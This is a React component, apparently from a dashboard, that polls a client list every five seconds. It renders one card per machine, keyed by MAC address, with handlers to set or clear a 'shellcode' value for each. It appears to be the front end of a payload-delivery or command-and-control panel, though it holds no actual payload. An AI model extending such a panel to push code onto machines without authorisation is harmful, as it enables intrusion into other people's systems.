import React, { Component } from 'react';
import AppHeader from '../components/AppHeader';
import Grid from 'material-ui/Grid';
import ComputerCard from '../components/ComputerCard/ComputerCard';
import Loader from '../components/Loader';
import theme from '../styles/theme.json';
import { getClients } from '../api/API';
var interval_op = undefined;

class ClientView extends Component {
    constructor(props) {
        super(props);

        this.state = {
            clients: [],
            isLoading: false
        };

        this.onAbort = this.onAbort.bind(this);
        this.onSetShellcode = this.onSetShellcode.bind(this);
    }

    componentDidMount() {
        let _this = this;
        this.setState({ isLoading: true });

        getClients()
            .then(clients => {
                _this.setState({ clients: clients, isLoading: false });
            }).then(() => {
                interval_op = setInterval(() => {
                    getClients()
                        .then(clients => {
                            _this.setState({ clients: clients });
                        })
                }, 5000);
            })
    }

    componentWillUnmount() {
        clearInterval(interval_op);
    }

    onAbort(client) {
        let clients = [...this.state.clients];
        let c = clients.find(_c => _c.mac === client.mac);
        c.shellcode = "";
        this.setState({ clients });
    };

    onSetShellcode(client, shellcode) {
        let clients = [...this.state.clients];
        let c = clients.find(_c => _c.mac === client.mac);
        c.shellcode = shellcode;
        this.setState({ clients });
    };


    render() {
        let clients = this.state.clients;
        let cards = clients.map(c => <ComputerCard img={this.props.img} client={c} onSet={this.onSetShellcode} onAbort={() => this.onAbort(c)} key={c.mac} />);

        return (
            <Grid container>

                {this.state.isLoading === true
                    ?
                    <Loader />
                    :
                    <Grid container>
                        {cards}
                        {cards}
                        {cards}
                        {cards}
                        {cards}
                        {cards}
                    </Grid>
                }

            </Grid>
        );
    }
}

export default ClientView;
